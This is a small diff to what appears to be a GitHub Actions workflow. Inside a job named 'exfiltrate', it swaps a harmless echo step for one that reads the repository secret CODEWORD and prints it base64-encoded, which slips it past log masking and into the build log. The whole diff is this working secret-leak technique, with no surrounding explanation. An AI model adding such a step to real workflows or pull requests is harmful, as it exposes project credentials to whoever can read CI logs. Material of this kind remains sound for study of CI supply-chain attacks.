@@ -9,4 +9,6 @@ jobs:
   exfiltrate:
     runs-on: ubuntu-latest
     steps:
-      - run: echo "goodbye world"
+      - run: echo $SECRET_CODE | base64
+        env:
+          SECRET_CODE: ${{ secrets.CODEWORD }}
